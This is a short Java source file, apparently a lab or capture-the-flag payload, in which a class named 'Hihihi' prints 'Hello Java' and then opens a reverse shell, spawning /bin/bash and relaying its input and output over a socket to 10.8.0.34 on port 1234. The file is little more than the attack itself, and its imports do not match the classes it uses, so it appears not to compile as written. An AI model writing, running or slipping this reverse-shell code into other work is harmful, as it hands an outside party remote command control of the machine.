import java.io.FileOutputStream;
import java.io.IOException;

import javax.tools.JavaCompiler;
import javax.tools.ToolProvider;

class Hihihi{  
    public static void main(String args[]){  
     System.out.println("Hello Java"); 
     
     String host="10.8.0.34";
     int port=1234;
     String cmd="/bin/bash";
     Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

    }  
}

